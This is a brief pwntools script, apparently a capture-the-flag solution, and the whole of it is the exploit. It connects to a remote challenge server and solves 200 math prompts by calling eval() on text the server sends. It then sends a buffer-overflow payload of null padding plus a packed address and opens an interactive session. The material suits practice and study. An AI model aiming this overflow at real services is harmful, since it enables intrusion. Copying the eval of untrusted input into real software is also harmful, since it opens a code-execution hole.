from pwn import*
#p = remote('node3.buuoj.cn',29579)
p = remote('39.97.210.182','40285')
context.log_level ='DEBUG'
for i in range(200):
	p.recvuntil('~Math:')
	equal = p.recvuntil(" = ???input answer:",drop=True)
	p.sendline(str(eval(equal)))
p.recvuntil('good')
p.sendline('\x00'* 0x64 + p32(0x12235612))
p.interactive()
